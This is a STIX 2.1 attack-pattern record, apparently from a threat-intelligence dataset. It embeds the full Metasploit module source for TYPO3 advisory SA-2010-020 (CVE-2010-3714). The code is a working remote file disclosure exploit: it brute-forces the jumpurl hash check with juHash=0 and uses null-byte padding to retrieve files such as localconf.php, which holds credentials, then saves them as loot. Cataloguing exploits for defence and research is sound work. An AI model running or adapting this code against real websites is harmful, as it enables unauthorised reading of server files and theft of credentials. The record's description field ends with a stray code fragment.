{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f83b50f6-abc0-496d-b1b0-0a45ecb2807b",
    "created": "2024-08-14T16:24:01.298269Z",
    "modified": "2024-08-14T16:24:01.298273Z",
    "name": "TYPO3 sa-2010-020 Remote File Disclosure",
    "description": " This module exploits a flaw in the way the TYPO3 jumpurl feature matches hashes. Due to this flaw a Remote File Disclosure is possible by matching the juhash of 0. This flaw can be used to read any file that the web server user account has access to view.  'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/typo3_sa_2010_020.rb",
            "external_id": "typo3_sa_2010_020.rb"
        },
        {
            "source_name": "reference",
            "url": "http://typo3.org/teams/security/security-bulletins/typo3-sa-2010-020"
        },
        {
            "source_name": "reference",
            "url": "http://gregorkopf.de/slides_berlinsides_2010.pdf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n\n  def initialize\n    super(\n      'Name' => 'TYPO3 sa-2010-020 Remote File Disclosure',\n      'Description' => %q{\n        This module exploits a flaw in the way the TYPO3 jumpurl feature matches hashes.\n        Due to this flaw a Remote File Disclosure is possible by matching the juhash of 0.\n        This flaw can be used to read any file that the web server user account has access to view.\n      },\n      'References' => [\n        ['CVE', '2010-3714'],\n        ['URL', 'http://typo3.org/teams/security/security-bulletins/typo3-sa-2010-020'],\n        ['URL', 'http://gregorkopf.de/slides_berlinsides_2010.pdf'],\n      ],\n      'Author' => [\n        'Chris John Riley',\n        'Gregor Kopf', # Original Discovery\n      ],\n      'License' => MSF_LICENSE\n    )\n\n    register_options(\n      [\n        OptString.new('URI', [true, 'TYPO3 Path', '/']),\n        OptString.new('RFILE', [true, 'The remote file to download', 'typo3conf/localconf.php']),\n        OptInt.new('MAX_TRIES', [true, 'Maximum tries', 10000]),\n      ]\n    )\n  end\n\n  def run\n    # Add padding to bypass TYPO3 security filters\n    #\n    # Null byte fixed in PHP 5.3.4\n    #\n\n    case datastore['RFILE']\n    when nil\n      # Nothing\n    when /localconf\\.php$/i\n      jumpurl = \"#{datastore['RFILE']}%00/.\"\n    when %r{^\\.\\.(/|\\\\)}i\n      print_error('Directory traversal detected... you might want to start that with a /.. or \\\\..')\n    else\n      jumpurl = datastore['RFILE'].to_s\n    end\n\n    print_status(\"Establishing a connection to #{rhost}:#{rport}\")\n    print_status(\"Trying to retrieve #{datastore['RFILE']}\")\n\n    location_base = Rex::Text.rand_text_numeric(1)\n    counter = 0\n\n    queue = []\n    print_status('Creating request queue')\n\n    1.upto(datastore['MAX_TRIES']) do\n      counter += 1\n      locationData = \"#{location_base}::#{counter}\"\n      queue << \"#{datastore['URI']}/index.php?jumpurl=#{jumpurl}&juSecure=1&locationData=#{locationData}&juHash=0\"\n      if ((counter.to_f / datastore['MAX_TRIES'].to_f) * 100.0).to_s =~ /(25|50|75|100).0$/ # Display percentage complete every 25%\n        percentage = (counter.to_f / datastore['MAX_TRIES'].to_f) * 100\n        print_status(\"Queue #{percentage.to_i}% compiled - [#{counter} / #{datastore['MAX_TRIES']}]\")\n      end\n    end\n\n    print_status('Queue compiled. Beginning requests... grab a coffee!')\n\n    counter = 0\n    queue.each do |check|\n      counter += 1\n      check = check.sub('//', '/') # Prevent double // from appearing in uri\n      begin\n        file = send_request_raw({\n          'uri'\t=> check,\n          'method'\t=> 'GET',\n          'headers'\t=>\n            {\n              'Connection' => 'Close'\n            }\n        }, 25)\n      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n        return\n      rescue ::Timeout::Error, ::Errno::EPIPE => e\n        print_error(e.message)\n        return\n      end\n\n      if file.nil?\n        print_error('Connection timed out')\n        return\n      end\n\n      if ((counter.to_f / queue.length.to_f) * 100.0).to_s =~ /\\d0.0$/ # Display percentage complete every 10%\n        percentage = (counter.to_f / queue.length.to_f) * 100.0\n        print_status(\"Requests #{percentage.to_i}% complete - [#{counter} / #{queue.length}]\")\n      end\n\n      # file can be nil\n      case file.headers['Content-Type']\n      when 'text/html'\n        case file.body\n        when 'jumpurl Secure: \"' + datastore['RFILE'] + '\" was not a valid file!'\n          print_error(\"File #{datastore['RFILE']} does not exist.\")\n          return\n        when /jumpurl Secure: locationData/i\n          print_error(\"File #{datastore['RFILE']} is not accessible.\")\n          return\n        when 'jumpurl Secure: The requested file was not allowed to be accessed through jumpUrl (path or file not allowed)!'\n          print_error(\"File #{datastore['RFILE']} is not allowed to be accessed through jumpUrl.\")\n          return\n        end\n      when 'application/octet-stream'\n        addr = Rex::Socket.getaddress(rhost) # Convert rhost to ip for DB\n        print_good('Found matching hash')\n        print_good('Writing local file ' + File.basename(datastore['RFILE'].downcase) + ' to loot')\n        store_loot('typo3_' + File.basename(datastore['RFILE'].downcase), 'text/xml', addr, file.body, 'typo3_' + File.basename(datastore['RFILE'].downcase), 'Typo3_sa_2010_020')\n        return\n      end\n    end\n\n    print_error(\"#{rhost}:#{rport} [Typo3-SA-2010-020] Failed to retrieve file #{datastore['RFILE']}\")\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ]
}